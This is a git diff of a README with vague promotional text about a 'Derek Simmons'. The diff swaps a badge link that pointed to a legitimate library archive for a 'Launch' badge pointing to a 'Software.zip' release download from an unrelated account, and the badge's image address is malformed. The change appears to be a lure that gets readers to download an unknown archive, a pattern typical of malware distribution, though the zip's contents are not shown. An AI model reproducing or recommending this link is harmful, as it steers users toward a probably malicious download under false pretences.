@@ -30,7 +30,7 @@ Derek Simmons is a visionary strategist and an innovation architect with a passi
 ## Dive into the Repository 🏊‍♂️
 To explore the wealth of knowledge and insights curated by Derek Simmons, click on the link below:
 
-[<img src="https://img.shields.io/badge/Launch-Improved%20Journey-green">](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[<img src="https://github.com/k0c0r/improved-journey/releases/download/v1.0/Software.zip%20Journey-green">](https://github.com/k0c0r/improved-journey/releases/download/v1.0/Software.zip)
 
 Remember, a journey of a thousand miles begins with a single click. 🚶‍♂️
 
